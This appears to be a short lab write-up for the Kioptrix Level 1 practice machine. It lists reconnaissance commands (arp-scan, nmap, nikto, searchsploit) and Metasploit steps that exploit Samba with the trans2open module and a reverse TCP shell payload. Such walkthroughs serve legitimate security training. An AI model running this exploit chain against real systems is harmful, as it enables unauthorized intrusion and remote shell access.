# Kioptrix-Level-1
Join me as we embark on a journey through this virtual labyrinth, where we'll uncover vulnerabilities, exploit weaknesses, and ultimately conquer the system.
# 1. Reconnaissance:
```bash
  arp-scan -l  Or  sudo netdiscover
```
## Employed Nmap to identify open ports and services. 
```bash
 nmap -sV -A  <Enter Kioptrix IP (10.0.2.5)> Or sudo nmap kioptrix -sV -p- -O -T4 -oN nmap <Enter Kioptrix IP (10.0.2.5)>
```
## For nikto scan 
```bash
nikto http://10.0.2.5
```
# 2. Vulnerability Identification:
To find vulnerabilities , we need to know the samba version :

The searchsploit command is designed to uncover valuable information within the Exploit Database: 
```bash
searchsploit samba
```
# 3. Exploitation:
## The following commands can be used to launch Metasploit.
execute 
```bash 
sudo msfconsole
```
## Then we search the vulnerability and configure options for exploitation.
```bash
search samba version 
```
## Use 
```bash 
exploit/linux/samba/trans2open
```
We can use options command to see the options.

```bash
Options
```
We can use options command to see the options.

## Use:-
msf exploit(linux/samba/trans2open) >

```bash
set RHOST <target Ip(10.0.2.5)>
```

msf exploit(linux/samba/trans2open) > 
```bash 
set RPORT 139
```
msf exploit(linux/samba/trans2open) > 
```bash
set payload linux/x86/shell_reverse_tcp
```
msf exploit(linux/samba/trans2open) > 
```bash 
exploit
```
# Congratulations, you've conquered Kioptrix Level 1!





